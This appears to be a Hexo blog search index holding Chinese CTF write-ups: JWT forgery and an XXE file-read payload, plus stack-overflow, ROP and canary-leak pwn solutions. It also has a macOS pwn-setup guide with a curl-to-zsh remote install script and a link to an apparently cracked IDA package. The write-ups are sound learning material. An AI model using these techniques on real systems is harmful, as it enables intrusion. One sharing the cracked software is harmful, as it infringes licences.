<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>数据结构(一)[线性表]</title>
    <url>/2020/05/18/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Hey, password is required here.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="b8aaf0741d2ccb2ce6088f5b079df5e67dc69a65a67eef04c93942ab698c0346"></script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>数据结构,开发</tag>
      </tags>
  </entry>
  <entry>
    <title>ISCC2020</title>
    <url>/2020/05/01/ISCC2020/</url>
    <content><![CDATA[<h1 id="未知的风险-1"><a href="#未知的风险-1" class="headerlink" title="未知的风险-1"></a>未知的风险-1</h1><p>题目有描述</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/ISCC2020/%E6%88%AA%E5%B1%8F2020-05-01%20%E4%B8%8B%E5%8D%885.34.20.png" data-fancybox="group" data-caption="描述" class="fancybox"><img alt="描述" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/ISCC2020/%E6%88%AA%E5%B1%8F2020-05-01%20%E4%B8%8B%E5%8D%885.34.20.png" class="lazyload" title="描述"></a></p>
<p>看题目，只有简单的一行</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/ISCC2020/%E6%89%B9%E6%B3%A8%202020-05-01%20170423.png" data-fancybox="group" data-caption="题目" class="fancybox"><img alt="题目" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/ISCC2020/%E6%89%B9%E6%B3%A8%202020-05-01%20170423.png" class="lazyload" title="题目"></a></p>
<p>hello guest，题目描述说只允许user进入，也就是我们要伪造身份。</p>
<p>抓包</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/ISCC2020/%E6%88%AA%E5%B1%8F2020-05-01%20%E4%B8%8B%E5%8D%885.39.10.png" data-fancybox="group" data-caption="bp1" class="fancybox"><img alt="bp1" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/ISCC2020/%E6%88%AA%E5%B1%8F2020-05-01%20%E4%B8%8B%E5%8D%885.39.10.png" class="lazyload" title="bp1"></a></p>
<p>这token格式一看就是jwt<em>（T0ki师傅说的）</em></p>
<p>要伪造身份，我们就要构造新的jwt，然而，虽然使用的是HS256，但是翻遍网站也找不到key。于是想到，可能服务器使用的是低版本的jwt，需要我们把加密格式改为none。</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/ISCC2020/%E6%89%B9%E6%B3%A8%202020-05-01%20164709.png" data-fancybox="group" data-caption="jwt_tool" class="fancybox"><img alt="jwt_tool" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/ISCC2020/%E6%89%B9%E6%B3%A8%202020-05-01%20164709.png" class="lazyload" title="jwt_tool"></a></p>
<p>用jwt_tool来修改jwt,并发包。</p>
<p>成功来到一个登陆页面，对应题目描述中的一把锁。阅读页面的js代码可知，数据会以xml实体post到一个doLogin.php页面，返回的code决定了登陆是否成功。于是我尝试修改了返回包，使code为1。</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/ISCC2020/QQ%E5%9B%BE%E7%89%8720200501164622.jpg" data-fancybox="group" data-caption="login" class="fancybox"><img alt="login" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/ISCC2020/QQ%E5%9B%BE%E7%89%8720200501164622.jpg" class="lazyload" title="login"></a></p>
<p>虽然登陆成功但是什么也没有。</p>
<p>再看题目描述，”他猜测密码格式flag{*}”,也就是说，用户密码才是flag。随即想到可能存在xxe漏洞，利用这个漏洞读取doLogin.php的源码，逆向分析验证代码获得flag。</p>
<p>payload：</p>
<p>​    <code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</code><br><code>&lt;!DOCTYPE N0P3 [&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</code><br><code>&gt; ]&gt;</code><br><code>&lt;user&gt;</code><br>  <code>&lt;username&gt;&amp;xxe;&lt;/username&gt;</code><br>  <code>&lt;password&gt;admin&lt;/password&gt;</code><br><code>&lt;/user&gt;</code></p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/ISCC2020/%E6%89%B9%E6%B3%A8%202020-05-01%20163522.png" data-fancybox="group" data-caption="xxe" class="fancybox"><img alt="xxe" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/ISCC2020/%E6%89%B9%E6%B3%A8%202020-05-01%20163522.png" class="lazyload" title="xxe"></a></p>
<p>读取成功。分析一下源码</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/ISCC2020/%E6%89%B9%E6%B3%A8%202020-05-01%20170635.png" data-fancybox="group" data-caption="code" class="fancybox"><img alt="code" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/ISCC2020/%E6%89%B9%E6%B3%A8%202020-05-01%20170635.png" class="lazyload" title="code"></a></p>
<p>发现include了一个flag.php，直接利用xxe去读</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/ISCC2020/QQ%E5%9B%BE%E7%89%8720200501164551.png" data-fancybox="group" data-caption="flag1" class="fancybox"><img alt="flag1" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/ISCC2020/QQ%E5%9B%BE%E7%89%8720200501164551.png" class="lazyload" title="flag1"></a></p>
<p>读到了，解码</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/ISCC2020/%E6%89%B9%E6%B3%A8%202020-05-01%20170256.png" data-fancybox="group" data-caption="flag" class="fancybox"><img alt="flag" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/ISCC2020/%E6%89%B9%E6%B3%A8%202020-05-01%20170256.png" class="lazyload" title="flag"></a></p>
<p>连源码都不用审，直接就能get flag。</p>
]]></content>
      <tags>
        <tag>CTF,参加的比赛</tag>
      </tags>
  </entry>
  <entry>
    <title>2020安恒月赛April</title>
    <url>/2020/04/27/2020%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9BApril/</url>
    <content><![CDATA[<p>这次依然是只看pwn,只看了一题，其他两题是堆，干脆就没看。</p>
<h1 id="echo-sever"><a href="#echo-sever" class="headerlink" title="echo sever"></a>echo sever</h1><p>连接题目，一共有两次输入，第一次输入名字的长度，第二次输入名字。</p>
<p>拖进ida</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/2020%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%20April/%E6%88%AA%E5%B1%8F2020-04-27%20%E4%B8%8A%E5%8D%8811.29.22.png" data-fancybox="group" data-caption="main" class="fancybox"><img alt="main" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/2020%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%20April/%E6%88%AA%E5%B1%8F2020-04-27%20%E4%B8%8A%E5%8D%8811.29.22.png" class="lazyload" title="main"></a></p>
<p>主函数没什么东西，调用了函数sub_4006d2，跟踪看一下</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/2020%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%20April/%E6%88%AA%E5%B1%8F2020-04-27%20%E4%B8%8B%E5%8D%889.29.28.png" data-fancybox="group" data-caption="4006d2" class="fancybox"><img alt="4006d2" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/2020%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%20April/%E6%88%AA%E5%B1%8F2020-04-27%20%E4%B8%8B%E5%8D%889.29.28.png" class="lazyload" title="4006d2"></a></p>
<p>输入的名字长度被传进了函数sub_4006A7,继续跟踪</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/2020%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%20April/%E6%88%AA%E5%B1%8F2020-04-27%20%E4%B8%8B%E5%8D%889.30.12.png" data-fancybox="group" data-caption="4006A7" class="fancybox"><img alt="4006A7" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/2020%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%20April/%E6%88%AA%E5%B1%8F2020-04-27%20%E4%B8%8B%E5%8D%889.30.12.png" class="lazyload" title="4006A7"></a></p>
<p>可以看到我们输入的名字长度被作为了read函数的读入字符长度，所以读入长度我们可控，只要我们输入的长度够大，就可以造成栈溢出。</p>
<p>但是由于函数中并没有现成的shellcode，所以这题是ret2libc。第一次遇到64位的ret2libc题目，并且用到了一个以前没有用过的工具，ROPgadget。</p>
<p>exp</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/2020%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%20April/%E6%88%AA%E5%B1%8F2020-04-27%20%E4%B8%8B%E5%8D%889.31.13.png" data-fancybox="group" data-caption="exp" class="fancybox"><img alt="exp" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/2020%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%20April/%E6%88%AA%E5%B1%8F2020-04-27%20%E4%B8%8B%E5%8D%889.31.13.png" class="lazyload" title="exp"></a></p>
<p>与x86不同，x64的程序传参时，会先把参数按顺序放进rdi, rsi, rdx, rcx, r8, r9这6个寄存器里去，然后多出来的参数才会通过栈传递。我们在进行ROP时，要先传参，再调用函数。</p>
<p>line 16～line 19在构造第一个payload，目的是利用printf函数输出read函数的got地址。先把第一个参数“%s”pop进rdi，再把read_got pop进rsi，之后调用printf就可以得到read函数的地址了。</p>
<p>那么怎样去执行pop rdi和pop rsi呢？就是直接在程序中寻找现有的小片段。</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/2020%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%20April/%E6%88%AA%E5%B1%8F2020-04-27%20%E4%B8%8B%E5%8D%889.34.36.png" data-fancybox="group" data-caption="ROPgadget" class="fancybox"><img alt="ROPgadget" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/2020%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%20April/%E6%88%AA%E5%B1%8F2020-04-27%20%E4%B8%8B%E5%8D%889.34.36.png" class="lazyload" title="ROPgadget"></a></p>
<p>利用ROPgadget就可以便捷的查询到想要的gadgets。可以看到，没有单独的pop rsi可以用，这也就是为什么payload里传递第二个参数时多pop了一个0，就是为了填充r15寄存器，无论写多少都可以。每个小片段最后都是ret，所以我们可以做到一个小片段结束接着另一个小片段继续执行。构造的ROP链就是payload。printf用到的参数也都是利用ROPgadget寻找到的，非常方便。</p>
<p>在line 23多接收了3个字节，这是观察得来的。一般程序运行时的实际地址是7f开头的，根据这个向后推移找到了正确的地址。这个7f大概是电脑运行时分配给应用程序的地址开头（最高位），所以我们在接收地址时应当只取前六位，然后在最高位补00。（我们从二进制文件里取出的地址最高位是00，如果不只取前六位的话计算会出现错误）</p>
<p>在line 32注释了一个地址，这个地址指向的是一个单独的ret指令。我们在打远程的时候需要多跳转一次ret。这是由于程序源代码中，定义的函数返回值类型是void导致的。如果不多跳转一次程序会崩溃，在远程的情况下，程序崩溃我们就得不到回显，所以打远程要多跳转一次，本地不用。</p>
<p><em>通过这道题真的学到了许多。其中的一些细节问题多谢<strong>不会修电脑</strong>师傅的耐心解答</em></p>
]]></content>
      <tags>
        <tag>CTF,参加的比赛,PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>在MacOS 10.15 上配置基本的Pwn环境</title>
    <url>/2020/04/22/MacOSPwn/</url>
    <content><![CDATA[<p><em>Catalina给我造成了相当多的麻烦，于是便记录一下过程</em></p>
<h1 id="安装Pwntools"><a href="#安装Pwntools" class="headerlink" title="安装Pwntools"></a>安装Pwntools</h1><p>首先，<strong>不要使用pip！</strong></p>
<p>网上安装pwntools的教程中最多的就是pip安装，官网上的安装介绍也是pip安装。但是我们使用MacOS的homebrew来安装。</p>
<p>如果你没有安装homebrew，执行下面的自动脚本</p>
<p><code>/bin/zsh -c &quot;$(curl -fsSL https://gitee.com/cunkai/HomebrewCN/raw/master/Homebrew.sh)&quot;</code></p>
<p>直接在终端输入回车根据提示执行即可。</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/MacOSPwn/%E6%88%AA%E5%B1%8F2020-04-22%20%E4%B8%8B%E5%8D%884.15.59.png" data-fancybox="group" data-caption="homebrew" class="fancybox"><img alt="homebrew" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/MacOSPwn/%E6%88%AA%E5%B1%8F2020-04-22%20%E4%B8%8B%E5%8D%884.15.59.png" class="lazyload" title="homebrew"></a></p>
<p>homebrew就安装好了。</p>
<p>执行<code>brew install pwntools</code> 安装pwntools</p>
<p>再执行<code>brew install https://raw.githubusercontent.com/Gallopsled/pwntools-binutils/master/osx/binutils-amd64.rb</code>  安装二进制工具binutils</p>
<p>安装binutils时你可能会遇到443报错，这是由于众所周知的原因导致raw.githubusercontent.com的DNS解析被污染了。</p>
<p>Step 1:  访问这个网站<a href="https://www.ipaddress.com/去查询raw.githubusercontent.com" target="_blank" rel="noopener">https://www.ipaddress.com/去查询raw.githubusercontent.com</a></p>
<p>的真实ip地址。</p>
<p>Step 2: 添加到/etc/hosts中</p>
<p>完成之后应该就可以下载了。</p>
<p>然后要把pwntools包加入到python环境里</p>
<p>在/Library/Python/2.7/site-packages中新建一个.pth文件然后写入</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;usr&#x2F;local&#x2F;Cellar&#x2F;pwntools&#x2F;4.0.1_1&#x2F;libexec&#x2F;lib&#x2F;python3.8&#x2F;site-packages</span><br></pre></td></tr></table></figure></div>

<p><em>这一行需要自己看情况写，pwntools版本和python版本可能会不同</em></p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/MacOSPwn/%E6%88%AA%E5%B1%8F2020-04-22%20%E4%B8%8B%E5%8D%888.45.40.png" data-fancybox="group" data-caption="path" class="fancybox"><img alt="path" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/MacOSPwn/%E6%88%AA%E5%B1%8F2020-04-22%20%E4%B8%8B%E5%8D%888.45.40.png" class="lazyload" title="path"></a>然后就可以测试基本功能了。</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/MacOSPwn/%E6%88%AA%E5%B1%8F2020-04-22%20%E4%B8%8B%E5%8D%884.54.32.png" data-fancybox="group" data-caption="checksec" class="fancybox"><img alt="checksec" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/MacOSPwn/%E6%88%AA%E5%B1%8F2020-04-22%20%E4%B8%8B%E5%8D%884.54.32.png" class="lazyload" title="checksec"></a></p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/MacOSPwn/%E6%88%AA%E5%B1%8F2020-04-22%20%E4%B8%8B%E5%8D%888.53.28.png" data-fancybox="group" data-caption="pwntools" class="fancybox"><img alt="pwntools" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/MacOSPwn/%E6%88%AA%E5%B1%8F2020-04-22%20%E4%B8%8B%E5%8D%888.53.28.png" class="lazyload" title="pwntools"></a></p>
<p>测试都OK</p>
<h1 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h1><p>ida在Major版本上很好安装，但是网上现有的所有的安装包都无法在Catalina上安装。解决办法大致是 安装Major虚拟机，再安装旧版ida，打补丁拷贝目录到Catalina。实际操作起来有很多问题且很麻烦，于是我直接打包好了Catalina可用的dmg。</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/source/Ida%20for%20MacOS10.15.dmg" target="_blank" rel="noopener">Ida for Catalina</a></p>
<p>密码 <strong><em>n0p3.top</em></strong>，记得不要更新。</p>
]]></content>
      <tags>
        <tag>PWN,MacOS,CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>hfctf-2020</title>
    <url>/2020/04/20/hfctf-2020/</url>
    <content><![CDATA[<p>参加了2020的虎符ctf，因为最近在学pwn，其他题目也就没有看，最后只解出一道pwn题。真的是太菜了，等着学习大师傅们的wp吧。</p>
<h1 id="count"><a href="#count" class="headerlink" title="count"></a>count</h1><p><em>只有这道题是在出wp之前做出的。</em></p>
<p>连接题目返回一个算式，要求通过200关。看起来不像pwn题，猜测可能是输入的地方存在漏洞。</p>
<p>拖进ida，发现好像汇编有点奇怪，不是平时常见架构的程序。</p>
<p>发现sub_400990是main函数</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/hfctf/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8A%E5%8D%8811.44.08.png" data-fancybox="group" data-caption="main" class="fancybox"><img alt="main" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/hfctf/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8A%E5%8D%8811.44.08.png" class="lazyload" title="main"></a></p>
<p>阅读代码，随机生成4个在0～99的整数，要求用户输入line 38的计算结果，连续输入正确200次后就会调用一个read函数，共度入100个字节，然而v8只有78个字节，所以这里存在栈溢出漏洞。紧接着下面有一个if，判断v9是否等于304305682，如果等于讲调用函数sub_400920,看一下这个函数</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/hfctf/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8A%E5%8D%8811.43.33.png" data-fancybox="group" data-caption="400920" class="fancybox"><img alt="400920" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/hfctf/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8A%E5%8D%8811.43.33.png" class="lazyload" title="400920"></a></p>
<p>直接就get shell。</p>
<p>所以我们的攻击思路就是，先完成200关的计算任务，最后利用栈溢出覆盖v9的值，使if成立即可。</p>
<p>exp如下</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/hfctf/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8A%E5%8D%8811.41.55.png" data-fancybox="group" data-caption="exp" class="fancybox"><img alt="exp" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/hfctf/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8A%E5%8D%8811.41.55.png" class="lazyload" title="exp"></a></p>
<p>因为不会正则，只能手动分离4个数字了orz</p>
<p>执行</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/hfctf/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8A%E5%8D%8811.32.41.png" data-fancybox="group" data-caption="flag" class="fancybox"><img alt="flag" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/hfctf/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8A%E5%8D%8811.32.41.png" class="lazyload" title="flag"></a></p>
<p>[以下为赛后Pwn题复现]</p>
]]></content>
      <tags>
        <tag>CTF,参加的比赛</tag>
      </tags>
  </entry>
  <entry>
    <title>XCTF-Pwn-Advance</title>
    <url>/2020/04/18/XCTF-Pwn-Advance/</url>
    <content><![CDATA[<h1 id="fogot"><a href="#fogot" class="headerlink" title="fogot"></a>fogot</h1><p>nc连接题目</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/fogot/%E6%88%AA%E5%B1%8F2020-04-18%20%E4%B8%8B%E5%8D%8810.04.30.png" data-fancybox="group" data-caption="nc" class="fancybox"><img alt="nc" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/fogot/%E6%88%AA%E5%B1%8F2020-04-18%20%E4%B8%8B%E5%8D%8810.04.30.png" class="lazyload" title="nc"></a></p>
<p>阅读文本，这个程序大概是一个检查邮箱格式是否合法的程序。</p>
<p>拖进ida分析</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/fogot/%E6%88%AA%E5%B1%8F2020-04-18%20%E4%B8%8B%E5%8D%887.54.22.png" data-fancybox="group" data-caption="main" class="fancybox"><img alt="main" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/fogot/%E6%88%AA%E5%B1%8F2020-04-18%20%E4%B8%8B%E5%8D%887.54.22.png" class="lazyload" title="main"></a></p>
<p>分两部分来看main函数，前半部分有数个函数指针，指向的是很多个只输出一条文本的函数。，接着用户的两次输入，可以看到有两处溢出，溢出点分别在33行和41行。继续看下半部分。</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/fogot/%E6%88%AA%E5%B1%8F2020-04-18%20%E4%B8%8B%E5%8D%887.55.24.png" data-fancybox="group" data-caption="main2" class="fancybox"><img alt="main2" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/fogot/%E6%88%AA%E5%B1%8F2020-04-18%20%E4%B8%8B%E5%8D%887.55.24.png" class="lazyload" title="main2"></a></p>
<p>有一段代码，解读一下就是在对我们第二次输入的邮箱地址进行逐个字符的分析，当找到‘@’时，就继续寻找‘.’，中间如果有没能找到的关键字符就执行不同的提示函数，前一段的数个函数指针指向的就是不同的提示函数。每完成一个要求v14就加1，最后调用不同的函数。</p>
<p>看一下栈</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/fogot/%E6%88%AA%E5%B1%8F2020-04-18%20%E4%B8%8B%E5%8D%887.58.28.png" data-fancybox="group" data-caption="栈" class="fancybox"><img alt="栈" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/fogot/%E6%88%AA%E5%B1%8F2020-04-18%20%E4%B8%8B%E5%8D%887.58.28.png" class="lazyload" title="栈"></a></p>
<p>我们输入的邮箱地址程序里又正好给了可以getflag的函数，所以我们的攻击思路就是，利用溢出漏洞覆盖某个函数指针指向的函数为目标函数，然后满足代码条件使它执行。</p>
<p>我选了v12函数指针，exp如下</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/fogot/%E6%88%AA%E5%B1%8F2020-04-18%20%E4%B8%8B%E5%8D%888.08.53.png" data-fancybox="group" data-caption="exp" class="fancybox"><img alt="exp" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/fogot/%E6%88%AA%E5%B1%8F2020-04-18%20%E4%B8%8B%E5%8D%888.08.53.png" class="lazyload" title="exp"></a></p>
<p>‘a@a.comm’最后会调用v12，后面的部分覆盖v12指向的函数。</p>
<h1 id="Mary-Morton"><a href="#Mary-Morton" class="headerlink" title="Mary_Morton"></a>Mary_Morton</h1><p>连接题目看一下</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/Mary_Morton/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8B%E5%8D%884.30.18.png" data-fancybox="group" data-caption="nc" class="fancybox"><img alt="nc" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/Mary_Morton/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8B%E5%8D%884.30.18.png" class="lazyload" title="nc"></a></p>
<p>可以选择攻击方式，栈溢出或者格式化字符串，但是这道题真的是想考察这两个知识而已吗？</p>
<p>拖进ida分析</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/Mary_Morton/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8B%E5%8D%884.26.08.png" data-fancybox="group" data-caption="main" class="fancybox"><img alt="main" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/Mary_Morton/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8B%E5%8D%884.26.08.png" class="lazyload" title="main"></a></p>
<p>可以看出程序有canary保护</p>
<p>main函数就是让用户选择，然后调用不同的函数的，主要看sub_4008EB和sub_400960</p>
<p>sub_4008EB</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/Mary_Morton/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8B%E5%8D%884.31.00.png" data-fancybox="group" data-caption="4008eb" class="fancybox"><img alt="4008eb" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/Mary_Morton/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8B%E5%8D%884.31.00.png" class="lazyload" title="4008eb"></a></p>
<p>如题目所说，确实存在一个格式化字符串漏洞，再去看sub_400960</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/Mary_Morton/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8B%E5%8D%884.31.12.png" data-fancybox="group" data-caption="400960" class="fancybox"><img alt="400960" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/Mary_Morton/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8B%E5%8D%884.31.12.png" class="lazyload" title="400960"></a></p>
<p>同样也真的存在一个栈溢出漏洞，那我们的攻击思路就有了：</p>
<p>先利用格式化字符串漏洞得到canary的值，再利用栈溢出漏洞构造rop链调用flag函数。canary的位置，首先计算步长，也就是printf取参数指针到buf的距离，测试得出是6，再加上buf到v2的距离0x90-0x8=0x88(十进制17)，所以17+6=23</p>
<p>exp如下</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/Mary_Morton/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8B%E5%8D%884.30.04.png" data-fancybox="group" data-caption="exp" class="fancybox"><img alt="exp" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/Mary_Morton/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8B%E5%8D%884.30.04.png" class="lazyload" title="exp"></a></p>
<p>花了我最长时间的地方居然是处理接收到的canary值，很多写法都莫名报错，最后这样写是可以的。</p>
<h1 id="pwn-200"><a href="#pwn-200" class="headerlink" title="pwn-200"></a>pwn-200</h1><p><em>这题用到pwntools的一个功能DynELF</em></p>
<p>nc连接只有一次输出一次输入，拖进ida分析</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-200/%E6%88%AA%E5%B1%8F2020-04-23%20%E4%B8%8B%E5%8D%888.08.30.png" data-fancybox="group" data-caption="main" class="fancybox"><img alt="main" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-200/%E6%88%AA%E5%B1%8F2020-04-23%20%E4%B8%8B%E5%8D%888.08.30.png" class="lazyload" title="main"></a></p>
<p>定义了很多变量，但是也没用到，调用了sub_8048484</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-200/%E6%88%AA%E5%B1%8F2020-04-23%20%E4%B8%8B%E5%8D%888.08.50.png" data-fancybox="group" data-caption="8048484" class="fancybox"><img alt="8048484" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-200/%E6%88%AA%E5%B1%8F2020-04-23%20%E4%B8%8B%E5%8D%888.08.50.png" class="lazyload" title="8048484"></a></p>
<p>很明显在line 6存在栈溢出漏洞，但是没有system函数，也没有shellcode，所以要用到DynELF。<em>（libcSearch也是查找libc用的，但是我并没有用过）</em></p>
<p>exp如下</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-200/%E6%88%AA%E5%B1%8F2020-04-23%20%E4%B8%8B%E5%8D%888.17.47.png" data-fancybox="group" data-caption="exp" class="fancybox"><img alt="exp" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-200/%E6%88%AA%E5%B1%8F2020-04-23%20%E4%B8%8B%E5%8D%888.17.47.png" class="lazyload" title="exp"></a></p>
<p>在使用DynELF的功能前需要先设定一个dyn对象，在line 12，第一个参数指定leak地址用的函数，第二个参数是目标程序。</p>
<p><em>DynELF的lookup函数就是利用我们写的leak函数来循环爆破寻找system的地址，leak函数有一定的格式。</em></p>
<p>shellcode可以通过一段可用的bss段储存</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-200/%E6%88%AA%E5%B1%8F2020-04-23%20%E4%B8%8B%E5%8D%889.34.53.png" data-fancybox="group" data-caption="bss" class="fancybox"><img alt="bss" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-200/%E6%88%AA%E5%B1%8F2020-04-23%20%E4%B8%8B%E5%8D%889.34.53.png" class="lazyload" title="bss"></a></p>
<p>exp逻辑不复杂，但是要注意堆栈的恢复和一些细节。</p>
